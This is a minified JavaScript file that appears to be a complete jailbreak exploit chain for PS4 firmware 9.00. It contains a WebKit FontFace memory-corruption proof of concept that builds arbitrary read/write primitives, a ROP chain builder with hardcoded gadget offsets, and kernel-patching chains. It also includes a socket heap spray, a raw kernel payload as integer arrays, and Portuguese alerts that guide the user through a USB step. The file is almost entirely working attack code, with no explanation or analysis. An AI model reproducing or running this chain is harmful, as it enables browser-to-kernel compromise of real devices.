function int64(t,i){return this.low=t>>>0,this.hi=i>>>0,this.add32inplace=function(t){var i=((this.low>>>0)+t&4294967295)>>>0,n=this.hi>>>0;i<this.low&&n++,this.hi=n,this.low=i},this.add32=function(t){var i=((this.low>>>0)+t&4294967295)>>>0,n=this.hi>>>0;return i<this.low&&n++,new int64(i,n)},this.sub32=function(t){var i=((this.low>>>0)-t&4294967295)>>>0,n=this.hi>>>0;return i>this.low&4294967295&&n--,new int64(i,n)},this.sub32inplace=function(t){var i=((this.low>>>0)-t&4294967295)>>>0,n=this.hi>>>0;i>this.low&4294967295&&n--,this.hi=n,this.low=i},this.and32=function(t){return new int64(this.low&t,this.hi)},this.and64=function(t,i){return new int64(this.low&t,this.hi&i)},this.toString=function(t){var i=(this.low>>>0).toString(16),n=(this.hi>>>0).toString(16);return 0==this.hi?i:n+(i=zeroFill(i,8))},this}function zeroFill(t,i){return(i-=t.toString().length)>0?new Array(i+(/\./.test(t)?2:1)).join("0")+t:t+""}function zeroFill(t,i){return(i-=t.toString().length)>0?new Array(i+(/\./.test(t)?2:1)).join("0")+t:t+""}const stack_sz=262144,reserve_upper_stack=65536,stack_reserved_idx=16384;window.rop=function(){return this.stackback=p.malloc32(65544),this.stack=this.stackback.add32(65536),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(262144),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1,this.branches_count=0;for(var s=1;s<49152;s++)this.stack_array[s+16384]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(s,t){t instanceof int64?(this.stack_array[16384+2*s]=t.low,this.stack_array[16384+2*s+1]=t.hi):(this.stack_array[16384+2*s]=t,this.stack_array[16384+2*s+1]=0)},this.push=function(s){this.finalizeSymbolic(this.pushSymbolic(),s)},this.push_write8=function(s,t){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["pop rsi"]),this.push(t),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(s,t,i,h,r,a,u){return null!=t&&(this.push(gadgets["pop rdi"]),this.push(t)),null!=i&&(this.push(gadgets["pop rsi"]),this.push(i)),null!=h&&(this.push(gadgets["pop rdx"]),this.push(h)),null!=r&&(this.push(gadgets["pop rcx"]),this.push(r)),null!=a&&(this.push(gadgets["pop r8"]),this.push(a)),null!=u&&(this.push(gadgets["pop r9"]),this.push(u)),8&this.stack.add32(8*this.count).low&&this.push(gadgets.ret),this.push(s),this},this.call=function(s,t,i,h,r,a,u){return this.fcall(s,t,i,h,r,a,u),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(s,t,i,h,r,a,u){return this.call(window.syscalls[s],t,i,h,r,a,u)},this.get_rsp=function(){return this.stack.add32(8*this.count)},this.write_result=function(s){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(s){this.push(gadgets["pop rdi"]),this.push(s),this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(s){this.push(window.gadgets["pop rsp"]),this.push(s)},this.run=function(){p.launch_chain(this),this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(s){this.KERNEL_BASE_PTR_VAR=s},this.rax_kernel=function(s){this.push(gadgets["pop rax"]),this.push(this.KERNEL_BASE_PTR_VAR),this.push(gadgets["mov rax, [rax]"]),this.push(gadgets["pop rsi"]),this.push(s),this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(s){this.push(gadgets["pop rdi"]);var t=this.pushSymbolic();return this.rax_kernel(s),this.push(gadgets["mov [rdi], rax"]),t},this.kwrite8=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rsi"]),this.push(t),this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rdx"]),this.push(t),this.push(gadgets["mov [rax], edx"])},this.kwrite2=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rcx"]),this.push(t),this.push(gadgets["mov [rax], cx"])},this.kwrite1=function(s,t){this.rax_kernel(s),this.push(gadgets["pop rcx"]),this.push(t),this.push(gadgets["mov [rax], cl"])},this.kwrite8_kaddr=function(s,t){this.rax_kernel(t),this.push(gadgets["mov rdx, rax"]),this.rax_kernel(s),this.push(gadgets["mov [rax], rdx"])},this};var chain,kchain,kchain2,SAVED_KERNEL_STACK_PTR,KERNEL_BASE_PTR,webKitBase,webKitRequirementBase,libSceLibcInternalBase,libKernelBase,textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072,OFFSET_WK_memset_import=680,OFFSET_WK___stack_chk_fail_import=376,OFFSET_WK_psl_builtin_import=3432,OFFSET_WKR_psl_builtin=211872,OFFSET_WK_setjmp_gadget_one=17214711,OFFSET_WK_setjmp_gadget_two=32301523,OFFSET_WK_longjmp_gadget_one=17214711,OFFSET_WK_longjmp_gadget_two=32301523,OFFSET_libcint_memset=325648,OFFSET_libcint_setjmp=767420,OFFSET_libcint_longjmp=767510,OFFSET_WK2_TLS_IMAGE=59670560,OFFSET_lk___stack_chk_fail=130912,OFFSET_lk_pthread_create=152848,OFFSET_lk_pthread_join=44960;var handle,random_path,ex_info,nogc=[],syscalls={},gadgets={},wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255,"mov [rax], cl":814767},wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480},wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538},hmd_gadgetmap={"add [r8], r12":179425},ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function userland(){p.launch_chain=function(e){e.push(window.gadgets["pop rdi"]),e.push(d),e.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(a,n),textArea.scrollLeft=0,p.write8(c.add32(0),window.gadgets.ret),p.write8(c.add32(16),e.stack),p.write8(c.add32(64),p.read8(d.add32(64))),p.write8(a,t),textArea.scrollLeft=0,p.write8(a,i)},p.malloc=function(a){var i=new Uint8Array(65536+a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=i,e},p.malloc32=function(a){var i=new Uint8Array(65536+4*a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=new Uint32Array(i.buffer),e},p.stringify=function(a){for(var i=new Uint8Array(a.length+1),e=0;e<a.length;e++)i[e]=255&a.charCodeAt(e);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))},p.array_from_address=function(a,i){var e=new Uint32Array(4096),r=p.leakval(e).add32(16);return p.write8(r,a),p.write4(r.add32(8),i),p.write4(r.add32(12),1),nogc.push(e),e},p.readstr=function(a){for(var i="",e=0;;e++){var r=p.read1(a.add32(e));if(0==r)break;i+=String.fromCharCode(r)}return i};var a=p.read8(p.leakval(textArea).add32(24)),i=p.read8(a);for(var e in webKitBase=p.read8(i).sub32(OFFSET_wk_vtable_first_element),(libSceLibcInternalBase=p.read8(r(webKitBase.add32(OFFSET_WK_memset_import)))).sub32inplace(OFFSET_libcint_memset),(libKernelBase=p.read8(r(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)))).sub32inplace(OFFSET_lk___stack_chk_fail),(webKitRequirementBase=p.read8(r(webKitBase.add32(OFFSET_WK_psl_builtin_import)))).sub32inplace(OFFSET_WKR_psl_builtin),wk_gadgetmap)window.gadgets[e]=webKitBase.add32(wk_gadgetmap[e]);for(var e in wkr_gadgetmap)window.gadgets[e]=webKitRequirementBase.add32(wkr_gadgetmap[e]);function r(a){var i=65535&p.read4(a),e=p.read4(a.add32(2));return 9727!=i?0:a.add32(6+e)}var n=p.malloc32(512),t=p.malloc32(512),d=p.malloc32(64),c=p.malloc32(64);p.write8(n.add32(0),n),p.write8(n.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two)),p.write8(n.add32(16),d),p.write8(n.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)),p.write8(n.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one)),p.write8(t.add32(0),t),p.write8(t.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two)),p.write8(t.add32(16),c),p.write8(t.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(t.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));var s,o=new Uint8Array(4096),l=p.leakval(o).add32(16),h=p.read8(l);p.write8(l,window.libKernelBase),p.write4(l.add32(8),262144);for(var _=0;_<262144;_++)if(114==o[_]&&100==o[_+1]&&108==o[_+2]&&111==o[_+3]&&99==o[_+4]){s=_;break}p.write4(l.add32(8),s+32);var k=new Uint32Array(1),g=new Uint8Array(k.buffer);for(_=0;_<s;_++)if(72==o[_]&&199==o[_+1]&&192==o[_+2]&&73==o[_+7]&&137==o[_+8]&&202==o[_+9]&&15==o[_+10]&&5==o[_+11]){g[0]=o[_+3],g[1]=o[_+4],g[2]=o[_+5],g[3]=o[_+6];var w=k[0];window.syscalls[w]=window.libKernelBase.add32(_)}if(p.write8(l,h),0==(chain=new rop).syscall(20).low)for(alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");;);}function run_hax(){userland(),0!=chain.syscall(23,0).low&&kernel(),jbdone()}function kernel(){extra_gadgets(),kchain_setup(),object_setup(),trigger_spray(),patch_once()}function load_prx(a){var i=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${a}`),0,handle,0);0!=i.low&&alert("failed to load prx/get handle "+a),p.write8(ex_info,424),0!=(i=chain.syscall(608,p.read4(handle),0,ex_info)).low&&alert("failed to get module info from handle");var e=p.read8(ex_info.add32(272));return 0!=p.read4(ex_info.add32(284))&&("libSceWebKit2.sprx"==a?e.sub32inplace(OFFSET_WK2_TLS_IMAGE):alert(`${a}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`)),e}function extra_gadgets(){var a=(handle=p.malloc(488)).add32(4),i=handle.add32(20);ex_info=i.add32(64),p.write8(a,44),chain.syscall(602,0,i,a),random_path=p.readstr(i);var e=load_prx("libSceIpmi.sprx"),r=load_prx("libSceHmd.sprx"),n=load_prx("libSceWebKit2.sprx");for(var t in hmd_gadgetmap)window.gadgets[t]=r.add32(hmd_gadgetmap[t]);for(var t in wk2_gadgetmap)window.gadgets[t]=n.add32(wk2_gadgetmap[t]);for(var t in ipmi_gadgetmap)window.gadgets[t]=e.add32(ipmi_gadgetmap[t]);for(var t in window.gadgets)p.read8(window.gadgets[t]),chain.fcall(window.syscalls[203],window.gadgets[t],16);chain.run()}function kchain_setup(){SAVED_KERNEL_STACK_PTR=p.malloc(512),KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8),p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295)),kchain=new rop,kchain2=new rop,chain.fcall(window.syscalls[203],kchain.stackback,262144),chain.fcall(window.syscalls[203],kchain2.stackback,262144),chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16),chain.run(),kchain.count=0,kchain2.count=0,kchain.set_kernel_var(KERNEL_BASE_PTR),kchain2.set_kernel_var(KERNEL_BASE_PTR),kchain.push(gadgets["pop rax"]),kchain.push(SAVED_KERNEL_STACK_PTR),kchain.push(gadgets["mov [rax], rdi"]),kchain.push(gadgets["pop r8"]),kchain.push(KERNEL_BASE_PTR),kchain.push(gadgets["add [r8], r12"]),kchain.kwrite1(28478968,1),kchain.push(gadgets.sti);var a=kchain.write_kernel_addr_to_chain_later(3222592),i=kchain.write_kernel_addr_to_chain_later(2079049);kchain.push(gadgets["pop rdi"]),kchain.push(6),kchain.push(gadgets["pop rsi"]),kchain.push(gadgets["mov rsp, rdi"]),kchain.push(gadgets["pop rdx"]),kchain.push(14),kchain.push(gadgets["pop rcx"]),kchain.push(0),kchain.push(gadgets["pop r8"]),kchain.push(0);var e=kchain.get_rsp();kchain.pushSymbolic(),kchain.push(gadgets["pop rsi"]),kchain.push(2147745843),kchain.push(gadgets["pop rdi"]),kchain.push(kchain2.stack);var r=kchain.get_rsp();kchain.pushSymbolic(),kchain.finalizeSymbolic(a,e),kchain.finalizeSymbolic(i,r),kchain2.kwrite2(6449268,37008),kchain2.kwrite1(2765,235),kchain2.kwrite1(2561021,235),kchain2.kwrite1(2561089,235),kchain2.kwrite1(2561213,235),kchain2.kwrite1(2561281,235),kchain2.kwrite1(2561709,235),kchain2.kwrite1(2562909,235),kchain2.kwrite1(2563117,235),kchain2.kwrite1(28478968,0);var n=kchain2.write_kernel_addr_to_chain_later(1561856),t=kchain2.write_kernel_addr_to_chain_later(3222592);kchain2.push(gadgets["pop rdi"]),kchain2.push(6),kchain2.push(gadgets["pop rsi"]);var d=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.push(gadgets["pop rdx"]),kchain2.push(14),kchain2.push(gadgets["pop rcx"]),kchain2.push(0),kchain2.push(gadgets["pop r8"]),kchain2.push(0);var c=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(n,d),kchain2.finalizeSymbolic(t,c),kchain2.kwrite4(1168,0),kchain2.kwrite1(1218,235),kchain2.kwrite2(1209,37008),kchain2.kwrite2(1205,37008),kchain2.kwrite1(6662,235),kchain2.kwrite4(527245,0),kchain2.kwrite2(2338500,59792),kchain2.kwrite1(2340479,235),kchain2.kwrite4(2235200,3284152648),kchain2.kwrite1(1467178,55),kchain2.kwrite1(1467181,55),kchain2.kwrite4(17827104,2),kchain2.kwrite8_kaddr(17827112,313261),kchain2.kwrite4(17827148,1),kchain2.kwrite4(3857979,3284607503);var s=kchain2.write_kernel_addr_to_chain_later(3857979);kchain2.push(gadgets["pop rdi"]),kchain2.push(2147811379);var o=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(s,o),kchain2.rax_kernel(3770769),kchain2.push(gadgets["mov rdx, rax"]),kchain2.push(gadgets["pop rsi"]),kchain2.push(SAVED_KERNEL_STACK_PTR),kchain2.push(gadgets["mov rax, [rsi]"]),kchain2.push(gadgets["pop rcx"]),kchain2.push(16),kchain2.push(gadgets["add rax, rcx"]),kchain2.push(gadgets["mov [rax], rdx"]),kchain2.push(gadgets["pop rdi"]);var l=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]),kchain2.push(gadgets.sti),kchain2.push(gadgets["pop rsp"]);var h=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(l,h)}function object_setup(){var a=chain.syscall(477,16384,49152,3,4112,4294967295,0),i=a.add32(16384),e=a.add32(32768);if(16384!=a.low)for(alert("enomem: "+a);;);p.write8(a,e),p.write8(a.add32(104),i),p.write8(i.sub32(121),gadgets["cli ; pop rax"]),p.write8(i.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]),p.write8(i.add32(8),kchain.stack),p.write8(i.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]),p.write8(e.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"]),chain.syscall(203,a,49152)}var trigger_spray=function(){for(var a=p.malloc(1728),i=0;i<432;i++)chain.fcall(window.syscalls[362]),chain.write_result4(a.add32(4*i));chain.run();var e=p.array_from_address(a,432),r=chain.syscall(97,2,1,0);if(r.low<256||r.low>=512)for(alert("invalid socket");;);var n=p.malloc(32);p.write8(n.add32(0),r),p.write4(n.add32(8),131071),p.write4(n.add32(12),0),p.write8(n.add32(16),0),p.write8(n.add32(24),0);for(i=0;i<432;i++)chain.fcall(window.syscalls[363],e[i],n,1,0,0,0);chain.run();for(i=18;i<432;i+=2)chain.fcall(window.syscalls[6],e[i]);chain.run(),alert('\n\nQuase pronto!!! Agora siga os passos abaixo para concluir o desbloqueio:\n\n1. Insira o USB com o arquivo exfathax_pico.img. \n2. Após a notificação "...USB é incompatível", clique em OK.');for(i=1;i<432;i+=2)chain.fcall(window.syscalls[6],e[i]);if(chain.run(),0==chain.syscall(23,0).low)return chain.fcall(window.syscalls[73],16384,49152),chain.fcall(window.syscalls[325]),chain.run(),void alert("\n\n\nNa tentativa de evitar erros, remova o USB agora e clique em OK.");alert('O desbloqueio FALHOU!!! Feche o navegador e\nrefaça "TODO PROCESSO", inclusive excluindo cookies e dados de sites.\n\nObservações:\nSó conecte o USB quando for solicitado.\nVerifeque se USB ficou bem conectado, permanecendo a falha,\npode ser que o USB esteja corrompido, reescreva a imagem.'),p.write8(0,0)},patch_once=function(){var a=chain.syscall(477,0,16384,7,4096,4294967295,0),i=p.array_from_address(a,4096);i[0]=3e3,i[1]=4270409728,i[2]=54365512,i[3]=251658240,i[4]=1213580037,i[5]=2336810377,i[6]=2515011710,i[7]=3892314112,i[8]=373,i[9]=53876223,i[10]=2336751616,i[11]=210749,i[12]=1066092544,i[13]=1962902856,i[14]=1032669419,i[15]=669,i[16]=4181035848,i[17]=1207959554,i[18]=52565387,i[19]=2336751616,i[20]=14084114,i[21]=2370306048,i[22]=171837,i[23]=898320384,i[24]=740,i[25]=85297992,i[26]=1207959555,i[27]=3118994059,i[28]=1207959552,i[29]=40058253,i[30]=2336751616,i[31]=180021,i[32]=361449472,i[33]=712,i[34]=3893529416,i[35]=156,i[36]=2050854216,i[37]=1207959554,i[38]=44709259,i[39]=2336751616,i[40]=174869,i[41]=311117824,i[42]=32744,i[43]=25552896,i[44]=3277651968,i[45]=1832749384,i[46]=1207959554,i[47]=40779009,i[48]=21495808,i[49]=159549,i[50]=1023494144,i[51]=624,i[52]=1899823432,i[53]=1207959554,i[54]=41041153,i[55]=21495808,i[56]=168765,i[57]=1023494144,i[58]=660,i[59]=1698496840,i[60]=1207959554,i[61]=40254721,i[62]=21495808,i[63]=165693,i[64]=1023494144,i[65]=648,i[66]=2302476616,i[67]=1207959554,i[68]=42614017,i[69]=21495808,i[70]=166717,i[71]=1023494144,i[72]=588,i[73]=1027408200,i[74]=3271557122,i[75]=3850979413,i[76]=283935560,i[77]=607422792,i[78]=609519944,i[79]=3977641736,i[80]=1207959553,i[81]=1265942661,i[82]=1220708680,i[83]=1212170379,i[84]=796180613,i[85]=678988616,i[86]=607927112,i[87]=2336754292,i[88]=3229960192,i[89]=3974831476,i[90]=410553160,i[91]=1962902856,i[92]=2139834605,i[93]=2084259856,i[94]=3799320612,i[95]=4279255239,i[96]=1224736767,i[97]=823163533,i[98]=835858934,i[99]=2769682377,i[100]=1207959553,i[101]=1561379971,i[102]=2303219139,i[103]=3223326693,i[104]=4294911304,i[105]=571473918,i[106]=1032538304,i[107]=456,i[108]=2425358279,i[109]=1204261008,i[110]=1217433604,i[111]=898320568,i[112]=428,i[113]=142051656,i[114]=1695565767,i[115]=3342633800,i[116]=2430023,i[117]=1204224e3,i[118]=2303197208,i[119]=474466104,i[120]=3091763344,i[121]=2100661064,i[122]=1207959553,i[123]=3340793737,i[124]=3343394887,i[125]=1204224256,i[126]=44,i[127]=2005747945,i[128]=361449524,i[129]=336,i[130]=2314348872,i[131]=2336763991,i[132]=92981,i[133]=1452099584,i[134]=3609806853,i[135]=3242786697,i[136]=2168981735,i[137]=59855,i[138]=1049184256,i[139]=3400,i[140]=571408385,i[141]=1438866880,i[142]=266701128,i[143]=625524768,i[144]=4294901759,i[145]=1220551183,i[146]=20594059,i[147]=130482176,i[148]=12828721,i[149]=893225800,i[150]=3338665985,i[151]=3284152583,i[152]=1032538112,i[153]=304,i[154]=3224438727,i[155]=2336751811,i[156]=76605,i[157]=822593280,i[158]=1208009664,i[159]=10894731,i[160]=2277965824,i[161]=2039297,i[162]=2425419313,i[163]=503678919,i[164]=3375431711,i[165]=2278002832,i[166]=2039305,i[167]=2425410097,i[168]=507414471,i[169]=3375431711,i[170]=222859408,i[171]=65536,i[172]=4290781711,i[173]=61205,i[174]=3223326464,i[175]=4294911304,i[176]=571473918,i[177]=1032538304,i[178]=220,i[179]=3224438727,i[180]=222822595,i[181]=65536,i[182]=1572872719,i[183]=1937339331,i[184]=1601004916,i[185]=1886614899,i[186]=1600417381,i[187]=1935763568,i[188]=1885287013,i[189]=1935631730,i[190]=6516345,i[191]=1953724787,i[192]=1918856549,i[193]=1836413797,i[194]=1752194917,i[195]=845509473,i[196]=1937339136,i[197]=1601004916,i[198]=1970496882,i[199]=1885300077,i[200]=1702060392,i[201]=2425356339,i[202]=0,i[203]=0,i[204]=1018096,i[205]=0,i[206]=3076464,i[207]=0,i[208]=101872,i[209]=0,i[210]=102128,i[211]=0,i[212]=40190224,i[213]=0,i[214]=619056,i[215]=0,i[216]=4206176,i[217]=0,i[218]=22151432,i[219]=0,i[220]=22151424,i[221]=0,i[222]=4599072,i[223]=0,i[224]=4599292,i[225]=0,i[226]=6445472,i[227]=0,i[228]=6449360,i[229]=0,i[230]=6446528,i[231]=0,i[232]=6447760,i[233]=0,i[234]=6448928,i[235]=0,chain.fcall(window.syscalls[203],a,16384),chain.fcall(a,p.read8(KERNEL_BASE_PTR)),chain.fcall(window.syscalls[73],a,16384),chain.run()};var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8602845184,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){for(var r=new ArrayBuffer(8),n=new Uint8Array(r),e=new Uint32Array(r),t=new Float64Array(r),a=[],o=0;o<SPRAY_FONTS;o++)a.push(new FontFace("font1","",{}));var f=new FontFace("font2","url(data:text/html,)",{});a.push(f);var i=[];for(o=0;o<512;o++)i.push(new Array(31));i[256][0]=1.5,i[257][0]={},i[258][0]=1.5;var _={a:i[256],b:new Uint32Array(1),c:!0},u={},A=1e7;function w(r){for(var n="",e=0;e<8;e++)n+=String.fromCharCode(r%256),r=(r-r%256)/256;return n}function S(r,n){void 0===n&&(n=0);for(var e=0,t=7;t>=0;t--)e=256*e+r.charCodeAt(n+t);return e}var l=[];function s(r,n){var e=n+"\0".repeat(r-STRING_OFFSET-8-n.length)+A++;return u[e]=1,l.push(e),e}var c=GUESS_FONT,d=!0,v=0,E=0;window.ffses={};do{var h=w(NPAGES+2);for(o=0;o<NPAGES;o++)h+=w(c+o*PAGE_SIZE);h+=w(INVALID_POINTER);for(o=0;o<256;o++)s(HASHMAP_BUCKET,h);ffses["search_"+ ++E]=new FontFaceSet(a);var F=s(HASHMAP_BUCKET,h),C=null,T=null;for(o=0;o<SPRAY_FONTS;o++)if(a[o].family="search"+E,F.substr(0,h.length)!=h){C=o;var p=F.substr(0,h.length);for(o=1;o<=NPAGES;o++)if(p.substr(8*o,8)!=h.substr(8*o,8)){T=S(h.substr(8*o,8));break}0==v++&&(c=T+2*PAGE_SIZE,T=null);break}(d=!d)&&(c+=NPAGES*PAGE_SIZE)}while(null===T);h="";h+=w(26),h+=w(T),h+=w(T+SIZEOF_CSS_FONT_FACE);for(o=0;o<19;o++)h+=w(INVALID_POINTER);for(o=0;o<256;o++)s(HASHMAP_BUCKET,h);var N=[];for(o=0;;o++){ffses["ffs_leak_"+o]=new FontFaceSet([a[C],a[C+1],f]);var m=s(HASHMAP_BUCKET,h);N.push(s(HASHMAP_BUCKET,h)),a[C].family="evil2",a[C+1].family="evil3";var P=S(m.substr(m.length-8));if(P<281474976710656)break}function H(r,n){var e="";e+="0000",e+="ÿ\0\0\0ÿÿÿÿ",e+=w(r),e+=w(2147483668),h="",h+=w(29),h+=w(T),h+=w(T+SIZEOF_CSS_FONT_FACE),h+=w(T+2*SIZEOF_CSS_FONT_FACE);for(var t=0;t<18;t++)h+=w(INVALID_POINTER);for(t=0;t<256;t++)s(HASHMAP_BUCKET,h);ffses[n]=new FontFaceSet([a[C],a[C+1],a[C+2],f]);s(HASHMAP_BUCKET,h);var o=s(HASHMAP_BUCKET,e);return a[C].family=n+"_evil1",a[C+1].family=n+"_evil2",a[C+2].family=n+"_evil3",N.push(o),o.length<1e3?H(r,n+"_"):o}var I=H(P,"ffs3");for(o=0;o<1e5;o++)s(128,"");var O=[];for(o=0;o<65536;o++)O.push({value:1094927426}),O.push({value:_});for(var b=null;null===b;){Object.defineProperties({},O);for(o=0;;o++)if(66==I.charCodeAt(o)&&68==I.charCodeAt(o+1)&&67==I.charCodeAt(o+2)&&65==I.charCodeAt(o+3)&&0==I.charCodeAt(o+4)&&0==I.charCodeAt(o+5)&&254==I.charCodeAt(o+6)&&255==I.charCodeAt(o+7)&&14==I.charCodeAt(o+24)){b=S(I,o+32);break}}var U=H(b,"ffs4"),M=S(U,16),y=S(U,24),R=S(H(M,"ffs5"),8),G=H(y,"ffs6");for(o=0;o<8;o++)n[o]=G.charCodeAt(o);var B=e[0],K=e[1];e[0]=65536,e[1]=0,i[257][1]={},i[257][0]=t[0],e[0]=T+12*SIZEOF_CSS_FONT_FACE|0,e[1]=(T-T%4294967296)/4294967296,i[256][o]=t[0],pp_s="",pp_s+=w(56);for(o=0;o<12;o++)pp_s+=w(T+o*SIZEOF_CSS_FONT_FACE);var g="";g+="0000",g+=w(INVALID_POINTER),g+=w(R),g+='\0\0\0\0"\0\0\0';var Z=[];for(o=0;o<12;o++)Z.push(a[C+o]);Z.push(f);var j=[a[C+12]];for(o=0;o<5;o++)j.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(o=0;o<HAMMER_NSTRINGS;o++)s(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(Z),s(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(j);var k=s(HASHMAP_BUCKET,g);N.push(k);for(o=0;o<13;o++)a[C+o].family="hammer"+o;function D(r){return i[257][32]=r,t[0]=i[258][0],4294967296*e[1]+e[0]}var L=new Uint32Array(8),V=new Uint8Array(1),x=new Uint32Array(8),Y={obj:null},z=D(V),q=D(Y);e[0]=B,e[1]=K,n[6]=7;var J,Q,W={jscell:t[0],butterfly:!0,buffer:L,size:22136};function X(r,n){n[4]=0|r,n[5]=r/4294967296|0}function $(r,n){X(r,L),L[6]=n}window.addrof=function(r){return Y.obj=r,(n=x)[4]+4294967296*n[5];var n},window.fakeobj=function(r){return X(r,x),Y.obj},window.read_mem_s=function(r,n){return $(r,n),""+V},window.read_mem_b=function(r,n){$(r,n);var e=new Uint8Array(n);return e.set(V),e},window.read_mem_as_string=function(r,n){for(var e=read_mem_b(r,n),t="",a=0;a<e.length;a++)t+=String.fromCharCode(e[a]);return t},window.ref_mem=function(r,n){return $(r,n),V},window.read_mem=function(r,n){$(r,n);for(var e=[],t=0;t<n;t++)e.push(V[t]);return e},window.write_mem=function(r,n){$(r,n.length);for(var e=0;e<n.length;e++)V[e]=n[e]},window.read_ptr_at=function(r){for(var n=0,e=read_mem(r,8),t=7;t>=0;t--)n=256*n+e[t];return n},window.write_ptr_at=function(r,n){for(var e=[],t=0;t<8;t++)e.push(255&n),n/=256;write_mem(r,e)},J=D(W)+16,e[0]=J,e[1]=(J-J%4294967296)/4294967296,i[258][0]=t[0],(Q=i[257][32])[4]=z,Q[5]=(z-z%4294967296)/4294967296,W.buffer=x,Q[4]=q,Q[5]=(q-q%4294967296)/4294967296,Q=null,function(){var r=read_ptr_at(addrof(k)+8)-208;write_mem(r,read_mem(r-96,208));for(var n=0;n<N.length;n++){var e=read_ptr_at(addrof(N[n])+8);write_ptr_at(e,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(e+8,e+20),write_ptr_at(e+16,2147483668)}write_ptr_at(R+248,133143986207)}();var rr=new Uint32Array(8),nr=new Uint32Array(2),er=addrof(nr),tr=fakeobj(addrof(W)+16);W.buffer=nr,tr[7]=1,W.buffer=rr,tr[4]=er,tr[5]=(er-er%4294967296)/4294967296,tr[7]=1;var ar={write8:function(r,n){rr[4]=r.low,rr[5]=r.hi,n instanceof int64?(nr[0]=n.low,nr[1]=n.hi):(nr[0]=n,nr[1]=0)},write4:function(r,n){rr[4]=r.low,rr[5]=r.hi,n instanceof int64?nr[0]=n.low:nr[0]=n},write2:function(r,n){rr[4]=r.low,rr[5]=r.hi;var e=4294901760&nr[0];n instanceof int64?nr[0]=65535&n.low|e:nr[0]=65535&n|e},write1:function(r,n){rr[4]=r.low,rr[5]=r.hi;var e=4294967040&nr[0];n instanceof int64?nr[0]=255&n.low|e:nr[0]=255&n|e},read8:function(r){return rr[4]=r.low,rr[5]=r.hi,new int64(nr[0],nr[1])},read4:function(r){return rr[4]=r.low,rr[5]=r.hi,nr[0]},read2:function(r){return rr[4]=r.low,rr[5]=r.hi,65535&nr[0]},read1:function(r){return rr[4]=r.low,rr[5]=r.hi,255&nr[0]},leakval:function(r){return Y.obj=r,new int64(x[4],x[5])}};window.p=ar,run_hax()}